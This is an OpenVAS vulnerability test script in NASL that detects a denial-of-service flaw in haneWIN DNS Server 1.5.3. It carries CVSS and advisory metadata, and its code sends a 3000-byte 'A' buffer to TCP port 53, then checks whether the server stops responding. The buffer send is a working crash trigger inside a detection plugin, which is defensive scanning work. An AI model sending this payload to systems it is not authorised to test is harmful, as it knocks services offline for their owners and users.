###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hanewin_dns_server_dos_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# haneWIN DNS Server Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803796");
  script_version("$Revision: 11402 $");
  script_bugtraq_id(65024);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-01-28 19:50:58 +0530 (Tue, 28 Jan 2014)");
  script_name("haneWIN DNS Server Denial Of Service Vulnerability");


  script_tag(name:"summary", value:"This host is running haneWIN DNS server and is prone to denial of service
vulnerability.");
  script_tag(name:"vuldetect", value:"Send crafted request and check is it vulnerable to DoS or not.");
  script_tag(name:"insight", value:"The flaw is due to an error when handling specially crafted requests which can
be exploited to crash the server.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to cause a denial of service.");
  script_tag(name:"affected", value:"haneWIN DNS Server version 1.5.3");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31014");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(53);
  exit(0);
}


DnsPort = 53;

if(!get_port_state(DnsPort)){
  exit(0);
}

## exit if socket is not created
DnsSock = open_sock_tcp(DnsPort);
if(!DnsSock){
  exit(0);
}

send(socket:DnsSock, data:"Check haneWIN DNS Server is running");
DnsRecv = recv(socket:DnsSock, length:1024);

if("haneWIN DNS Server is running" >!< DnsRecv)
{
  close(DnsSock);
  exit(0);
}

BadData = crap(length:3000, data:"A");
send(socket:DnsSock, data:BadData);

DnsRecv = recv(socket:DnsSock, length:1024);

if(!DnsRecv)
{
  security_message(DnsPort);
  exit(0);
}

close(DnsSock);
